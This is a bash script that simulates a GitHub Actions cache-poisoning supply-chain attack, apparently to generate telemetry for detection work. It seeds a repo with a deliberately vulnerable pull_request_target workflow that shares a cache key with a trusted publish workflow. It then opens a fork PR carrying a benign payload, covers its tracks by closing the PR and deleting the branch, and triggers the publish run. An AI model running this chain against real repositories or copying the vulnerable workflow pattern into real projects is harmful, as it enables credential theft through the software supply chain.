#!/usr/bin/env bash
# tanstack / Actions-cache-poisoning supply-chain attack simulation (minimal)
#
# A fork PR abuses a pre-existing `pull_request_target` workflow to poison a
# shared Actions cache; a trusted push-to-main publish run later restores it and
# runs the payload. The lockfile is untouched so the cache key stays aligned.
#
# Simulated TTPs:
#   * `pull_request_target` "Pwn Request": untrusted PR ref checked out + built.
#   * Cache poisoning across the fork<->base boundary (contents: read does NOT
#     gate the cache save).
#   * Shared cache key (hashFiles pnpm-lock.yaml) between PR-target and publish.
#   * Anti-forensics: PR closed + fork branch deleted after the run.
#   * OIDC theft (out-of-band): publish only GRANTS id-token; the restored
#     payload runs on the trusted runner and echoes a placeholder OIDC token.
#
set -eu

# ---- parameters -------------------------------------------------------------
ORG="${ORG:-supplychain-labs}"                        # victim owner (org) that hosts the base repo
REPO=sim-tanstack                # victim repo (ships a package via publish workflow)
PUBLISH_WF=".github/workflows/publish.yml"    # trusted publish (push to main, id-token)
PRCHECK_WF=".github/workflows/pr-checks.yml"  # pre-existing pull_request_target build
PAYLOAD="tools/prebuild.mjs"     # benign cache-poisoning payload run during the PR build
ATTACK_BRANCH=pr-histfix         # fork branch the PR head lives on
WAIT_SECONDS="${WAIT_SECONDS:-45}"  # let runs register in telemetry

# Attacker's git identity for the fork-PR payload commit -- DISTINCT from the
# legit actor (sim-operator) that seeds the baseline and cuts the release.
ATTACK_NAME="${ATTACK_NAME:-pr-contributor}"
ATTACK_EMAIL="${ATTACK_EMAIL:-pr-contributor@example.net}"

git config --global user.name  "sim-operator"
git config --global user.email "sim-operator@example.com"
git config --global init.defaultBranch main
git config --global credential.helper '!gh auth git-credential'

PUSHER=$(gh api user -q '.login')   # operator account = owner of the attacker FORK
echo "=== base: $ORG/$REPO   fork: $PUSHER/$REPO   pr-branch: $ATTACK_BRANCH ==="

# ---- baseline files (the vulnerable-but-legit repo) -------------------------

# Trusted publish workflow: push to main, id-token, RESTORES the shared cache.
read -r -d '' PUBLISH_YML <<'YML' || true
name: publish
run-name: Publish package
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Restore dependency store (shared cache)
        uses: actions/cache@v4
        with:
          path: .pnpm-store
          key: Linux-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
      - name: Build from restored store
        run: |
          echo "build using restored dependency store (simulated)"
          # attacker code restored from the poisoned cache runs here on the trusted runner:
          if [ -f .pnpm-store/ci-hook.mjs ]; then node .pnpm-store/ci-hook.mjs; fi
YML

# Pre-existing PR-check workflow: pull_request_target, checks out the untrusted
# PR merge ref, builds it, and shares the SAME cache key -> the poisoning surface.
read -r -d '' PRCHECK_YML <<'YML' || true
name: pr-checks
run-name: PR checks
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
permissions:
  contents: read   # NOTE: read-only does NOT gate actions/cache save
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout untrusted PR merge ref
        uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.number }}/merge
      - name: Prime dependency store (shared cache)
        uses: actions/cache@v4
        with:
          path: .pnpm-store
          key: Linux-pnpm-store-${{ hashFiles('**/pnpm-lock.yaml') }}
      - name: Build PR (runs untrusted code)
        run: |
          mkdir -p .pnpm-store
          echo "install + build from PR head (simulated)"
          if [ -f tools/prebuild.mjs ]; then node tools/prebuild.mjs || true; fi
      # actions/cache post-step now SAVES .pnpm-store (poisoned) under the shared key
YML

# Benign payload: writes a marker into the cached dependency store. No network,
# no real malware -- stands in for the code that poisons the pnpm store.
read -r -d '' PAYLOAD_MJS <<'JS' || true
// benign simulation of a cache-poisoning payload (no network, no real malware)
import { mkdirSync, writeFileSync } from 'node:fs';
mkdirSync('.pnpm-store', { recursive: true });
// plant a benign CI-side payload in the cached store; publish.yml runs it on the trusted runner
writeFileSync('.pnpm-store/ci-hook.mjs',
  'console.log("OIDC token: sim-placeholder-not-a-real-token");\n');
console.log('prebuild: planted benign CI-side payload in dependency store (simulated poisoning)');
JS

PKG_JSON='{
  "name": "sim-frontend",
  "version": "1.0.0",
  "private": true,
  "packageManager": "pnpm@9.0.0"
}'

# Minimal lockfile -- its CONTENT feeds hashFiles() and thus the cache key. The
# attack never touches it, so the fork-PR run and main compute the SAME key.
LOCK_YAML='lockfileVersion: "9.0"
settings:
  autoInstallPeers: true
importers:
  .: {}'

# ---- helper: seed a file on the base default branch via Contents API (signed)
put_file() {  # $1=path  $2=content  $3=message
  local b64; b64=$(printf '%s' "$2" | base64 | tr -d '\n')
  gh api -X PUT "repos/$ORG/$REPO/contents/$1" \
    -f message="$3" -f content="$b64" -f branch="$DEFBR" >/dev/null
}

# -----------------------------------------------------------------------------
echo "=== [0] clean any prior run ==="
gh repo delete "$ORG/$REPO"     --yes 2>/dev/null || true
gh repo delete "$PUSHER/$REPO"  --yes 2>/dev/null || true
sleep 2

# -----------------------------------------------------------------------------
echo "=== [1] seed base repo + vulnerable-but-legit baseline (signed) ==="
gh repo create "$ORG/$REPO" --public --add-readme >/dev/null
sleep 3
DEFBR=$(gh api "repos/$ORG/$REPO" -q '.default_branch')

put_file "package.json"   "$PKG_JSON"     "chore: add package manifest"
put_file "pnpm-lock.yaml" "$LOCK_YAML"    "chore: add dependency lockfile"
put_file "$PUBLISH_WF"    "$PUBLISH_YML"  "ci: add publish workflow"
put_file "$PRCHECK_WF"    "$PRCHECK_YML"  "ci: add PR checks workflow"
echo "  seeded publish.yml (id-token + cache restore) and pr-checks.yml (pull_request_target + cache save) on $DEFBR"

# -----------------------------------------------------------------------------
echo "=== [2] ATTACK: fork from operator account + add payload on a branch (unsigned) ==="
gh repo fork "$ORG/$REPO" --clone=false >/dev/null 2>&1 || true
sleep 5   # let the fork materialize
cd /tmp; rm -rf "$REPO"; git clone -q "https://github.com/$PUSHER/$REPO"; cd "$REPO"
git checkout -q -b "$ATTACK_BRANCH"
mkdir -p "$(dirname "$PAYLOAD")"
printf '%s\n' "$PAYLOAD_MJS" > "$PAYLOAD"
git add "$PAYLOAD"
# Attacker identity, distinct from the legit actor; unsigned local commit.
GIT_AUTHOR_NAME="$ATTACK_NAME"  GIT_AUTHOR_EMAIL="$ATTACK_EMAIL" \
GIT_COMMITTER_NAME="$ATTACK_NAME" GIT_COMMITTER_EMAIL="$ATTACK_EMAIL" \
  git commit -q -m "build: add prebuild helper" --no-gpg-sign
PAY_SHA=$(git rev-parse HEAD)
git push -q origin "$ATTACK_BRANCH"
echo "  fork $PUSHER/$REPO: added $PAYLOAD on $ATTACK_BRANCH @ $PAY_SHA as $ATTACK_NAME <$ATTACK_EMAIL> (unsigned; != legit sim-operator); lockfile untouched (key stays aligned)"

# -----------------------------------------------------------------------------
echo "=== [3] TRIGGER: open fork PR against base main (fires pull_request_target) ==="
gh pr create -R "$ORG/$REPO" \
  --head "$PUSHER:$ATTACK_BRANCH" --base "$DEFBR" \
  --title "Simplify history build" \
  --body  "Small refactor of the history build step." >/dev/null
PR_NUM=$(gh pr list -R "$ORG/$REPO" --head "$ATTACK_BRANCH" --json number -q '.[0].number')
echo "  opened PR #$PR_NUM ($PUSHER:$ATTACK_BRANCH -> $DEFBR) -> pr-checks.yml runs the untrusted build + saves poisoned cache"

# -----------------------------------------------------------------------------
echo "=== [4] WAIT (let the pull_request_target run register in telemetry) ==="
echo "  sleeping ${WAIT_SECONDS}s ..."
sleep "$WAIT_SECONDS"

# -----------------------------------------------------------------------------
echo "=== [5] ANTI-FORENSICS: close the PR + delete the fork branch ==="
gh pr close "$PR_NUM" -R "$ORG/$REPO" >/dev/null 2>&1 || true
gh api -X DELETE "repos/$PUSHER/$REPO/git/refs/heads/$ATTACK_BRANCH" >/dev/null 2>&1 || true
echo "  PR #$PR_NUM closed; fork branch $ATTACK_BRANCH deleted (poisoned cache persists in base scope)"

# -----------------------------------------------------------------------------
echo "=== [6] DETONATE: push a commit to base main (fires publish.yml -> cache restore) ==="
cd /tmp; rm -rf "$REPO-base"; git clone -q "https://github.com/$ORG/$REPO" "$REPO-base"; cd "$REPO-base"
git checkout -q "$DEFBR"
echo "sim release $(date -u +%FT%TZ)" > RELEASE_NOTES.md
git add RELEASE_NOTES.md
git commit -q -m "release: cut package version"
git push -q origin "$DEFBR"
echo "  pushed to $DEFBR -> publish.yml restores the shared cache and runs the payload (echoes placeholder OIDC token)"

echo "=== DONE ==="
echo "  fork-PR poisoned the shared Actions cache; publish run on $DEFBR restores it"
echo "  base repo: https://github.com/$ORG/$REPO"
